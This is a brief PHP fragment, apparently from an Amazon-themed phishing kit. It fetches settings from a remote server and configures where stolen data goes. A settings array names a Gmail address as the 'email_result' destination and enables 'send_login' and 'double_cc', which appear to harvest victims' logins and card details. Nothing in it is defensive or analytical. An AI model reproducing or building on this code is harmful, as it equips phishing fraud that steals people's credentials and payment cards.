...
function get_setting($owner) {
    ...
    $random = rand(0,1);
    curl_setopt($get, CURLOPT_URL,'http://'.$server['server_1'].'/api/amzsetting/get_setting.php');
...
$setting = array (
  'email_result' => 'magickartuas@gmail.com',
  'sender_mail' => 'nodb@min-max.com',
  'site_parameter' => 'app-billing',
  'site_password' => 'app-billing',
  'site_param_on' => 'on',
  'site_pass_on' => '',
  'send_login' => 'on',
  'double_cc' => 'on',
